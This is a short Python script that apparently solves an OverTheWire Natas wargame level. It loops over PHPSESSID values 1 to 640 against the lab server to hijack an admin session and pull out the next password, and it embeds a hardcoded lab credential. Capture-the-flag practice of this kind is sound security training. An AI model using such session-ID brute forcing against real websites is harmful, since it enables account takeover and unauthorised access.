import re
from base64 import b64encode
from time import sleep

import requests

idx = 0
pw = ''
url = 'http://natas18.natas.labs.overthewire.org/index.php?debug'
userAndPass = b64encode(b"natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP").decode("ascii")
headers = {'Authorization': 'Basic %s' % userAndPass}


def injectCookie(username, sessionid):
    res = requests.get(url, headers=headers, data={'username': username}, cookies={'PHPSESSID': str(sessionid)})
    return res.text


while idx < 640:
    idx += 1
    print("looking for %i" % idx)

    text = injectCookie('natas18', idx).splitlines()
    debugs = [line for line in text if re.search(r'Password: ', line)]
    print(debugs)

    sleep(0.3)
